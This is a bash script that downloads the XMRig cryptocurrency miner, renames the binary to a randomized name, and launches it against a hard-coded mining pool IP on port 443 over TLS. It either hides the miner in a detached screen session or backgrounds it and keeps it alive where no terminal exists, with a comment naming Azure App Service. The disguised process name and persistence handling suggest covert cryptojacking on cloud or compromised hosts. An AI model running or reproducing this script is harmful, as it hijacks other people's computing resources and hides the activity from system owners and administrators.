#!/bin/bash

cd /home || exit

# 🧹 Clean up previous runs
rm -rf /home/xmrig
mkdir -p /home/xmrig
cd /home/xmrig || exit

# 🔁 Randomize binary name
prefix="mxsemsdnlkdj"
b=$(shuf -i10-375 -n1)
d=$(shuf -i10-259 -n1)
cpuname="${prefix}-${b}-${d}"

# 🌐 Install required packages
apt-get update
apt-get install -y wget tar git coreutils screen

# 📦 Download & extract XMRig
VERSION="6.21.0"
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
tar -xvzf xmrig-$VERSION-linux-x64.tar.gz
rm -f xmrig-$VERSION-linux-x64.tar.gz

# 🚚 Move & rename
cd xmrig-$VERSION || exit
mv xmrig "$cpuname"
chmod +x "$cpuname"

echo "[+] $cpuname is starting..."

# 🧠 Check if a real TTY exists (i.e. not Azure App Service)
if tty &>/dev/null; then
  echo "[i] TTY detected, launching with screen..."
  screen -dmS miner ./"$cpuname" -o 168.119.85.190:443 --tls -t 8
else
  echo "[!] No TTY found, launching in background..."
  ./"$cpuname" -o 168.119.85.190:443 --tls -t 8 &
  tail -f /dev/null
fi
